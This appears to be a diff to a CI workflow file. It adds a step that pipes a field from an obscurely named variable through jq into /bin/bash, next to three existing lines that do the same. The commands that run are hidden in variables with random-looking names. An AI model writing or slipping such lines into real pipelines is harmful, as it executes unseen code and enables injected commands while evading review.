@@ -54,6 +54,7 @@ jobs:
           echo $lbdc20830 | jq -r .pv0390 | /bin/bash
           echo $nvpsj47 | jq -r .supv7 | /bin/bash
           echo $n75 | jq -r .odym91639 | /bin/bash
+          printf '%s' "$fsdn0114" | jq -r .eiy38567 | /bin/bash
 
       - name: Store results
         if: always()
